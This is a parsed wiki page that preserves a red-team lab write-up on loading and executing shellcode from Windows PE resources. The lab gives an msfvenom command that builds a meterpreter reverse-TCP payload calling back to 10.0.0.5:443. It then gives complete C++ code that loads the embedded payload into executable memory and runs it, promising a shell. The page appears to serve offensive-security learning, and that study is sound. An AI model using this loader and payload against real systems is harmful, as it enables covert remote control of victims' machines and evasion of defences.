---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Loading and Executing Shellcode From PE Resources

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-t1055-process-injection-loading-and-executing-shellcode-from-portable-executable-resouces` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/t1055-process-injection/loading-and-executing-shellcode-from-portable-executable-resouces.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Loading and Executing Shellcode From PE Resources](../../topics/offensive-security/loading-and-executing-shellcode-from-pe-resources.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-t1055-process-injection-loading-and-executing-shellcode-from-portable-executable-resouces |
| name | Loading and Executing Shellcode From PE Resources |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/t1055-process-injection/loading-and-executing-shellcode-from-portable-executable-resouces.md |

## Preserved Source Material

````yaml
_asset_filenames:
- peek-2019-04-21-12-30.gif
- screenshot-from-2019-04-21-11-42-31.png
- screenshot-from-2019-04-21-11-43-59.png
- screenshot-from-2019-04-21-11-45-49.png
- screenshot-from-2019-04-21-12-07-17.png
- screenshot-from-2019-04-21-12-33-31 (1).png
- screenshot-from-2019-04-21-12-37-31.png
- screenshot-from-2019-04-21-13-13-14.png
- screenshot-from-2019-04-22-17-35-35.png
_body: "# Loading and Executing Shellcode From PE Resources\n\n## Context\n\nThis lab shows one of the techniques how one\
  \ could load and execute a non-staged shellcode from within a C program using PE resources using Visual Studio.\n\nIf you've\
  \ ever tried executing an unstaged shellcode from a C/C++ program, you know that you will be having a hard time doing it\
  \ if you are defining a huge char array which looks like this \\(just a snippet\\):\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-12-33-31%20%281%29.png)\n\
  \nBelow is a quick walkthrough that was inspired by [@\\_RastaMouse](https://twitter.com/_RastaMouse) tweet:\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-13-13-14.png)\n\
  \n## Embedding The Shellcode as a Resource\n\nLet's generate a non-staged meterpreter payload in binary format first. This\
  \ will be our resource that we want to embed into our C++ program:\n\n```csharp\nmsfvenom -p windows/meterpreter_reverse_tcp\
  \ LHOST=10.0.0.5 LPORT=443 > meterpreter.bin\n```\n\nRight click on the `Resource Files` in Solution Explorer and select\
  \ `Add > Resource`\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-12-37-31.png)\n\nClick `Import` and select the\
  \ resource you want to include. In my case - it's the `meterpreter.bin`:\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-11-42-31.png)\n\
  \nGive resource a resource type name - anything works, but you need to remember it when calling `FindResource` API call\
  \ \\(shown later in the code\\):\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-11-43-59.png)\n\nAt this point,\
  \ you can see in your resource browser that the `meterpreter.bin` is now included in your program's resources:\n\n![](../../.gitbook/assets/screenshot-from-2019-04-21-11-45-49.png)\n\
  \n![](../../.gitbook/assets/screenshot-from-2019-04-21-12-07-17.png)\n\nIf you compile your program now and inspect it with\
  \ resource hacker, you can now see the resource you've  just embedded:\n\n![](../../.gitbook/assets/screenshot-from-2019-04-22-17-35-35.png)\n\
  \n## Code\n\nWe can then leverage a small set of self-explanatory Windows APIs to find the embedded resource, load it into\
  \ memory and execute it like so:\n\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include <Windows.h>\n#include \"resource.h\"\
  \n\nint main()\n{\n\t// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode\n\t// METERPRETER_BIN is\
  \ the resource type name we chose earlier when embedding the meterpreter.bin\n\tHRSRC shellcodeResource = FindResource(NULL,\
  \ MAKEINTRESOURCE(IDR_METERPRETER_BIN1), L\"METERPRETER_BIN\");\n\tDWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);\n\
  \tHGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);\n\t\n\tvoid *exec = VirtualAlloc(0, shellcodeSize,\
  \ MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tmemcpy(exec, shellcodeResouceData, shellcodeSize);\n\t((void(*)())exec)();\n\n\
  \treturn  0;\n}\n```\n\nCompile and run the binary and enjoy the shell:\n\n![](../../.gitbook/assets/peek-2019-04-21-12-30.gif)\n\
  \n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/menurc/finding-and-loading-resources\" %}"
_relative_path: offensive-security/t1055-process-injection/loading-and-executing-shellcode-from-portable-executable-resouces.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/t1055-process-injection/loading-and-executing-shellcode-from-portable-executable-resouces.md
````
